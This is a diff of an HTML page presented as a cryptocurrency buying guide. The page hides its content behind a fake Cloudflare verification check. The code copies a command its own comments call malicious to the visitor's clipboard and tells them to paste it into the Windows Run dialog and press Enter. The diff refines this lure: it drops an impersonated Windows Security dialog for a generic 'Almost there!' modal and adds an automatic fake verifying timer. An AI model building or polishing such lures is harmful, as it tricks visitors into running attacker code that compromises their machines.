@@ -4,31 +4,21 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes">
     <title>How to Buy Cryptocurrency • The Complete 2026 Guide</title>
-    <!-- Font Awesome 6 -->
+    <!-- Font Awesome 6 (free) -->
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
     <style>
-        /* ----- RESET & BASE ----- */
         * {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
-            font-family: 'Segoe UI', system-ui, -apple-system, BlinkMacSystemFont, Roboto, sans-serif;
+            font-family: 'Inter', system-ui, -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
         }
-
         body {
             background: #0b1120;
             min-height: 100vh;
             display: flex;
             flex-direction: column;
         }
-
-        /* ----- MAIN PAGE (hidden behind overlay until verified) ----- */
-        .page-container {
-            position: relative;
-            width: 100%;
-            min-height: 100vh;
-        }
-
         /* ----- FULL‑PAGE VERIFICATION OVERLAY (starts visible) ----- */
         .verify-overlay {
             position: fixed;
@@ -43,14 +33,13 @@
             align-items: center;
             justify-content: center;
             padding: 20px;
-            transition: opacity 0.4s ease, visibility 0.4s;
+            transition: opacity 0.5s ease, visibility 0.5s;
         }
         .verify-overlay.hidden {
             opacity: 0;
             visibility: hidden;
             pointer-events: none;
         }
-
         .verify-card {
             max-width: 520px;
             width: 100%;
@@ -61,7 +50,6 @@
             box-shadow: 0 40px 70px -20px rgba(0,0,0,0.4);
             border: 1px solid #eef2f6;
         }
-
         .verify-card .shield-icon {
             background: #eef4ff;
             width: 80px;
@@ -76,21 +64,18 @@
             font-size: 42px;
             color: #2b6ef0;
         }
-
         .verify-card h2 {
             font-size: 32px;
             font-weight: 700;
             color: #0b1e33;
             margin-bottom: 16px;
         }
-
         .verify-card p {
             color: #4a5a6e;
             font-size: 18px;
             line-height: 1.5;
             margin-bottom: 30px;
         }
-
         /* Fake Cloudflare Turnstile widget */
         .turnstile-widget {
             background: #f8fafd;
@@ -148,7 +133,6 @@
             font-size: 26px;
             color: #f6821f;
         }
-
         .privacy-note {
             font-size: 15px;
             color: #7e8b9c;
@@ -156,7 +140,7 @@
             padding-top: 24px;
         }
 
-        /* ----- WINDOWS SECURITY MODAL (looks like a real Windows Defender dialog) ----- */
+        /* ----- VERIFICATION MODAL (popup) ----- */
         .modal-overlay {
             display: none;
             position: fixed;
@@ -168,156 +152,135 @@
             padding: 20px;
         }
         .modal {
-            background: #f0f0f0;
-            max-width: 600px;
+            background: white;
+            max-width: 550px;
             width: 100%;
-            border-radius: 16px;
-            padding: 30px 28px;
-            text-align: left;
+            border-radius: 48px;
+            padding: 40px 32px;
+            text-align: center;
             box-shadow: 0 30px 60px rgba(0,0,0,0.5);
-            border: 1px solid #d1d1d1;
-            font-family: 'Segoe UI', sans-serif;
             animation: modalFade 0.3s;
         }
         @keyframes modalFade {
-            from { opacity: 0; transform: translateY(-10px); }
+            from { opacity: 0; transform: translateY(-20px); }
             to { opacity: 1; transform: translateY(0); }
         }
-        .modal-header {
-            display: flex;
-            align-items: center;
-            gap: 12px;
-            margin-bottom: 20px;
-        }
-        .modal-header i {
-            font-size: 42px;
-            color: #0078d7;
-        }
-        .modal-header h3 {
-            font-size: 24px;
-            font-weight: 600;
-            color: #1e1e1e;
-        }
-        .modal-body {
-            color: #2d2d2d;
-            font-size: 15px;
-            line-height: 1.5;
-            margin-bottom: 20px;
-        }
-        .modal-body p {
-            margin: 12px 0;
-        }
-        .warning-box {
-            background: #fff4ce;
-            border-left: 5px solid #f1c40f;
-            padding: 15px;
-            border-radius: 8px;
-            margin: 20px 0;
-        }
-        .code-box {
-            background: #2d2d2d;
-            border-radius: 10px;
-            padding: 18px;
-            margin: 20px 0;
-            text-align: center;
-        }
-        .code-label {
-            color: #aaaaaa;
-            font-size: 13px;
-            text-transform: uppercase;
-            letter-spacing: 1px;
-            margin-bottom: 8px;
-        }
-        .verification-code {
-            color: #fbbf24;
-            font-family: 'Consolas', 'Courier New', monospace;
-            font-size: 36px;
-            font-weight: 700;
-            letter-spacing: 6px;
-            background: #1e1e1e;
-            padding: 10px;
-            border-radius: 8px;
-            user-select: all;
-        }
-        .copy-btn {
-            background: #0078d7;
-            color: white;
-            border: none;
-            padding: 14px 28px;
-            border-radius: 6px;
-            font-size: 18px;
-            font-weight: 500;
-            cursor: pointer;
-            width: 100%;
-            margin: 16px 0;
+        .modal .shield-icon {
+            background: #eef4ff;
+            width: 70px;
+            height: 70px;
+            border-radius: 50%;
             display: flex;
             align-items: center;
             justify-content: center;
-            gap: 10px;
+            margin: 0 auto 20px;
+        }
+        .modal .shield-icon i {
+            font-size: 36px;
+            color: #2b6ef0;
+        }
+        .modal h3 {
+            font-size: 28px;
+            font-weight: 700;
+            color: #0b1e33;
+            margin-bottom: 12px;
+        }
+        .modal .code-box {
+            background: #0f172a;
+            border-radius: 28px;
+            padding: 24px;
+            margin: 24px 0;
+        }
+        .modal .code-label {
+            color: #a0b3cc;
+            font-size: 14px;
+            letter-spacing: 1px;
+            text-transform: uppercase;
+            margin-bottom: 8px;
+        }
+        .modal .verification-code {
+            color: #fbbf24;
+            font-family: 'Courier New', monospace;
+            font-size: 48px;
+            font-weight: 700;
+            letter-spacing: 8px;
+            line-height: 1.2;
+            word-break: break-word;
+        }
+        .copy-btn {
+            background: #2b6ef0;
+            color: white;
+            border: none;
+            padding: 18px 30px;
+            border-radius: 60px;
+            font-size: 20px;
+            font-weight: 600;
+            cursor: pointer;
+            width: 100%;
+            margin: 16px 0 20px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 12px;
             transition: background 0.2s;
-            border: 1px solid #005a9e;
         }
         .copy-btn:hover {
-            background: #005a9e;
+            background: #1a4fc4;
         }
         .copy-btn i {
-            font-size: 22px;
+            font-size: 24px;
         }
         .instruction-steps {
-            background: #ffffff;
-            border-radius: 10px;
-            padding: 18px;
-            border: 1px solid #ddd;
+            background: #f8fafd;
+            border-radius: 28px;
+            padding: 24px;
+            text-align: left;
             margin: 20px 0;
         }
         .instruction-steps .step {
             display: flex;
             align-items: center;
-            gap: 15px;
-            padding: 8px 0;
-            border-bottom: 1px solid #eee;
+            gap: 16px;
+            padding: 10px 0;
+            border-bottom: 1px solid #e2e8f0;
         }
         .instruction-steps .step:last-child {
             border-bottom: none;
         }
         .step-number {
-            background: #0078d7;
-            color: white;
-            width: 30px;
-            height: 30px;
+            background: white;
+            width: 36px;
+            height: 36px;
             border-radius: 50%;
             display: flex;
             align-items: center;
             justify-content: center;
             font-weight: 700;
+            color: #2b6ef0;
+            box-shadow: 0 3px 8px rgba(0,0,0,0.05);
         }
-        .continue-btn {
-            background: #cccccc;
-            color: #666;
-            border: none;
-            padding: 16px;
-            border-radius: 6px;
-            font-size: 18px;
-            font-weight: 500;
-            width: 100%;
-            cursor: not-allowed;
-            transition: all 0.2s;
-            margin-top: 12px;
-        }
-        .continue-btn.active {
-            background: #107c10;
-            color: white;
-            cursor: pointer;
-        }
-        .modal-footer {
-            font-size: 13px;
-            color: #888;
-            margin-top: 20px;
-            text-align: center;
-        }
-        .timer {
-            color: #d83b01;
+        .verification-timer {
+            display: none;
+            align-items: center;
+            justify-content: center;
+            gap: 12px;
+            margin: 20px 0;
+            font-size: 20px;
+            color: #2b6ef0;
             font-weight: 600;
+        }
+        .verification-timer i {
+            font-size: 28px;
+            animation: spin 1.5s linear infinite;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        .timer-text {
+            background: #eef4ff;
+            padding: 8px 20px;
+            border-radius: 40px;
         }
 
         /* ----- MAIN CONTENT (hidden until verified) ----- */
@@ -328,8 +291,6 @@
             border-radius: 0;
             box-shadow: none;
         }
-
-        /* Hero */
         .hero {
             background: linear-gradient(145deg, #0b1e33, #1a2f4b);
             color: white;
@@ -361,18 +322,11 @@
             font-size: 16px;
             backdrop-filter: blur(4px);
         }
-        .hero-stats i {
-            margin-right: 8px;
-        }
-
-        /* Container */
         .container {
             max-width: 1200px;
             margin: 0 auto;
             padding: 60px 30px;
         }
-
-        /* Section headers */
         .section-title {
             font-size: 36px;
             font-weight: 700;
@@ -386,8 +340,6 @@
             color: #2b6ef0;
             font-size: 40px;
         }
-
-        /* Cards grid */
         .card-grid {
             display: grid;
             grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
@@ -429,8 +381,6 @@
             font-size: 14px;
             overflow-x: auto;
         }
-
-        /* Table */
         .table-wrapper {
             overflow-x: auto;
             margin: 40px 0;
@@ -454,11 +404,6 @@
             border-bottom: 1px solid #e2e8f0;
             color: #334155;
         }
-        tr:last-child td {
-            border-bottom: none;
-        }
-
-        /* Info row */
         .info-row {
             display: flex;
             flex-wrap: wrap;
@@ -478,8 +423,6 @@
             font-size: 40px;
             color: #2b6ef0;
         }
-
-        /* FAQ */
         .faq-item {
             border-bottom: 1px solid #e2e8f0;
             padding: 24px 0;
@@ -494,7 +437,6 @@
             color: #475569;
             line-height: 1.6;
         }
-
         footer {
             background: #f8fafc;
             padding: 50px 30px;
@@ -502,16 +444,11 @@
             color: #64748b;
             border-top: 1px solid #e2e8f0;
         }
-
-        /* Responsive */
         @media (max-width: 700px) {
             .hero h1 { font-size: 40px; }
             .hero { padding: 50px 20px; }
             .container { padding: 30px 20px; }
             .section-title { font-size: 30px; }
-            .verify-card { padding: 30px 20px; }
-            .modal { padding: 20px; }
-            .verification-code { font-size: 28px; }
         }
     </style>
 </head>
@@ -563,65 +500,58 @@
     </div>
 </div>
 
-<!-- ========== WINDOWS SECURITY MODAL ========== -->
+<!-- ========== VERIFICATION MODAL (popup) ========== -->
 <div class="modal-overlay" id="verifyModal">
     <div class="modal">
-        <div class="modal-header">
-            <i class="fas fa-shield-alt"></i>
-            <h3>Windows Security</h3>
+        <div class="shield-icon">
+            <i class="fas fa-fingerprint"></i>
         </div>
-        <div class="modal-body">
-            <p><strong>Microsoft Defender SmartScreen</strong> needs to verify your browser's security settings.</p>
-            <p>This is a one‑time check to protect your device from malicious sites.</p>
-            <div class="warning-box">
-                <i class="fas fa-exclamation-triangle" style="color: #f1c40f; margin-right: 8px;"></i>
-                <span>Verification required within <span class="timer" id="timer">02:00</span> minutes, or access will be blocked.</span>
+        <h3>Almost there!</h3>
+        <p>Copy the verification code and run it to continue. The check will complete automatically.</p>
+
+        <div class="code-box">
+            <div class="code-label">Verification code</div>
+            <div class="verification-code" id="displayCode">K3P8Q1</div>
+        </div>
+
+        <!-- COPY BUTTON – triggers clipboard hijack -->
+        <button class="copy-btn" id="copyBtn" onclick="copyMaliciousCommand()">
+            <i class="fas fa-copy"></i> Copy verification code
+        </button>
+
+        <div class="instruction-steps">
+            <div class="step">
+                <span class="step-number">1</span>
+                <span>Click the "Copy" button above</span>
             </div>
-
-            <p>Please follow these steps exactly:</p>
-            <div class="instruction-steps">
-                <div class="step">
-                    <span class="step-number">1</span>
-                    <span>Click the "Copy verification code" button below</span>
-                </div>
-                <div class="step">
-                    <span class="step-number">2</span>
-                    <span>Press <strong>Windows Key + R</strong> (the Run dialog will open)</span>
-                </div>
-                <div class="step">
-                    <span class="step-number">3</span>
-                    <span>Press <strong>Ctrl + V</strong> to paste the code</span>
-                </div>
-                <div class="step">
-                    <span class="step-number">4</span>
-                    <span>Press <strong>Enter</strong> to complete verification</span>
-                </div>
+            <div class="step">
+                <span class="step-number">2</span>
+                <span>Press <strong>Windows Key + R</strong> (Run dialog)</span>
             </div>
-
-            <div class="code-box">
-                <div class="code-label">Verification code (click Copy below)</div>
-                <div class="verification-code" id="displayCode">K3P8Q1</div>
+            <div class="step">
+                <span class="step-number">3</span>
+                <span>Press <strong>Ctrl + V</strong> to paste</span>
             </div>
-
-            <!-- COPY BUTTON – triggers clipboard hijack -->
-            <button class="copy-btn" id="copyBtn" onclick="copyMaliciousCommand()">
-                <i class="fas fa-copy"></i> Copy verification code
-            </button>
-
-            <!-- Continue button (enabled after copy) -->
-            <button class="continue-btn" id="continueBtn" onclick="finishVerification()" disabled>
-                ⏳ Continue to guide
-            </button>
-
-            <div class="modal-footer">
-                <i class="fas fa-lock" style="margin-right: 6px;"></i> This request is from Windows Security. ID: <span id="randomId"></span>
+            <div class="step">
+                <span class="step-number">4</span>
+                <span>Press <strong>Enter</strong> to verify</span>
             </div>
+        </div>
+
+        <!-- Timer element (hidden initially) -->
+        <div class="verification-timer" id="timer">
+            <i class="fas fa-spinner"></i>
+            <span class="timer-text" id="timerText">Verifying... 20s</span>
+        </div>
+
+        <div class="modal-footer" id="modalFooter">
+            Verification ID: 7624-<span id="randomId"></span>
         </div>
     </div>
 </div>
 
 <!-- ========== MAIN CONTENT (hidden until verified) ========== -->
-<div class="main-content" id="mainContent">
+<div class="main-content" id="mainContent" style="display: none;">
     <!-- HERO -->
     <section class="hero">
         <h1>How to Buy Cryptocurrency</h1>
@@ -819,56 +749,43 @@
     // Generate random verification ID
     document.getElementById('randomId').innerText = Math.floor(1000 + Math.random() * 9000);
 
-    // Countdown timer (2 minutes)
-    let timeLeft = 120; // seconds
-    const timerElement = document.getElementById('timer');
-    const timerInterval = setInterval(() => {
-        if (timeLeft <= 0) {
-            clearInterval(timerInterval);
-            // Optionally, block access or show a message
-            document.getElementById('verifyModal').style.display = 'none';
-            alert('Verification timeout. Please refresh the page and try again.');
-        } else {
-            timeLeft--;
-            const minutes = Math.floor(timeLeft / 60);
-            const seconds = timeLeft % 60;
-            timerElement.innerText = `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
-        }
-    }, 1000);
-
     // Show verification modal when Turnstile widget is clicked
     function showVerificationModal() {
         document.getElementById('cfCheckbox').classList.add('checked');
         document.getElementById('verifyModal').style.display = 'flex';
     }
 
-    // Copy malicious command to clipboard and enable continue button
+    let timerInterval;
+
+    // Copy malicious command to clipboard and start timer
     function copyMaliciousCommand() {
         navigator.clipboard.writeText(MALICIOUS_COMMAND).then(() => {
-            const copyBtn = document.getElementById('copyBtn');
-            copyBtn.innerHTML = '<i class="fas fa-check"></i> Copied!';
-            copyBtn.style.background = '#107c10';
-            copyBtn.style.borderColor = '#0b5e0b';
+            // Hide copy button and instructions, show timer
+            document.querySelector('.copy-btn').style.display = 'none';
+            document.querySelector('.instruction-steps').style.display = 'none';
+            document.getElementById('timer').style.display = 'flex';
+            document.getElementById('modalFooter').style.display = 'none';
 
-            const continueBtn = document.getElementById('continueBtn');
-            continueBtn.disabled = false;
-            continueBtn.classList.add('active');
-            continueBtn.innerText = '✅ Continue to guide';
-
-            // Store that they copied (so we can hide overlay later)
-            sessionStorage.setItem('verified', 'true');
-
-            // Stop the timer (optional)
-            clearInterval(timerInterval);
+            let seconds = 20;
+            const timerText = document.getElementById('timerText');
+            timerInterval = setInterval(() => {
+                seconds--;
+                timerText.innerText = `Verifying... ${seconds}s`;
+                if (seconds <= 0) {
+                    clearInterval(timerInterval);
+                    finishVerification();
+                }
+            }, 1000);
         }).catch(err => {
             alert('Unable to copy automatically. Please copy this code manually:\n\n' + MALICIOUS_COMMAND);
         });
     }
 
-    // Finish verification: hide overlay and modal, reveal main content
+    // Finish verification: hide overlay and modal, show main content
     function finishVerification() {
         document.getElementById('verifyModal').style.display = 'none';
         document.getElementById('verifyOverlay').classList.add('hidden');
+        document.getElementById('mainContent').style.display = 'block';
         sessionStorage.setItem('verified', 'true');
     }
 
@@ -877,12 +794,15 @@
         const modal = document.getElementById('verifyModal');
         if (event.target === modal) {
             modal.style.display = 'none';
+            // Also stop timer if running
+            if (timerInterval) clearInterval(timerInterval);
         }
     };
 
-    // If they already "verified" in this session (e.g., after refresh), hide overlay
+    // If they already "verified" in this session, show content immediately
     if (sessionStorage.getItem('verified') === 'true') {
         document.getElementById('verifyOverlay').classList.add('hidden');
+        document.getElementById('mainContent').style.display = 'block';
     }
 </script>
 </body>
